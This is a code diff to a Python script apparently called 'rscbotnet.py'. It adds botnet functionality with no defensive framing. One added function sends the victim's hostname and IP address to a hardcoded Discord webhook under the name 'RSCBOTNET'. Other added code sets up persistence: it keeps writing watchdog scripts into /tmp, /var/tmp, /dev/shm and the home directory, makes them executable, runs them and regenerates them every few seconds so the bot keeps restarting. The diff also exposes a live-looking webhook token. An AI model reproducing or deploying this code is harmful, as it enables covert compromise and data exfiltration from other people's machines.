@@ -9,6 +9,37 @@ import subprocess
 import http.client
 import psutil
 import win32com.client
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+def send_system_info_to_discord():
+    try:
+        # Obtener información del sistema
+        host_name = socket.gethostname()  # Nombre del host
+        ip_address = socket.gethostbyname(host_name)  # IP asociada al host
+        
+        # Preparar el contenido del mensaje
+        content = f"**Información del sistema**\n"
+        content += f"**Host Name:** {host_name}\n"
+        content += f"**IP Address:** {ip_address}\n"
+        content += f"**Additional Info:** Custom message or logs can be added here."
+        
+        # URL del webhook
+        webhook_url = "https://discord.com/api/webhooks/1344334763904860223/dHcKxkd_uy2YDnnIhvNiu7Y4rwRlPmICBsoQc2MVBHdpKBGp6kp0EF2nJjFaqdjKHZ9_"
+        
+        # Enviar el mensaje al webhook de Discord
+        webhook = DiscordWebhook(url=webhook_url, username="RSCBOTNET", content=content)
+        response = webhook.execute()
+        
+        # Verificar si el mensaje fue enviado correctamente
+        if response.status_code == 200:
+            print("Mensaje enviado correctamente a Discord.")
+        else:
+            print(f"Error al enviar el webhook. Código de estado: {response.status_code}")
+    
+    except Exception as e:
+        print(f"Error: {e}")
+
+    send_system_info_to_discord() 
 
 def install_dependencies():
     try:
@@ -18,6 +49,71 @@ def install_dependencies():
         subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil", "pywin32"])
 
 install_dependencies()
+
+# Original script name that should remain active
+SCRIPT_ORIGINAL = "rscbotnet.py"
+
+# Potential directories where the files can be placed
+DIRECTORIES = ["/tmp", "/var/tmp", os.path.expanduser("~/"), "/dev/shm"]
+
+def get_random_path():
+    """Generates a random path in a valid directory."""
+    directory = random.choice(DIRECTORIES)
+    filename = "monolith.py"
+    return os.path.join(directory, filename)
+
+PERSISTENCE_CODE = f"""
+import os
+import time
+import subprocess
+
+SCRIPT = "{SCRIPT_ORIGINAL}"
+
+def run_script():
+    while True:
+        if not is_process_active(SCRIPT):
+            subprocess.Popen(["python3", SCRIPT])
+        time.sleep(5)
+
+def is_process_active(script):
+    try:
+        output = subprocess.check_output(["pgrep", "-f", script])
+        return bool(output.strip())
+    except subprocess.CalledProcessError:
+        return False
+
+run_script()
+"""
+
+def create_persistent_files():
+    """Creates and runs three persistent files in random locations."""
+    paths = [get_random_path() for _ in range(3)]
+    
+    for path in paths:
+        with open(path, "w") as f:
+            f.write(PERSISTENCE_CODE)
+        os.chmod(path, 0o755)  # Make the file executable
+        subprocess.Popen(["python3", path])  # Run the script
+
+    return paths
+
+def activate_persistence():
+    """Starts persistence by regenerating files every 3 seconds in a separate thread."""
+    def persistence():
+        while True:
+            paths = create_persistent_files()
+            time.sleep(3)
+
+            # Remove old files before regenerating them
+            for path in paths:
+                if os.path.exists(path):
+                    os.remove(path)
+
+    thread = threading.Thread(target=persistence, daemon=True)
+    thread.start()
+
+activate_persistence()
+
 
 num_bots = 10
 running = True
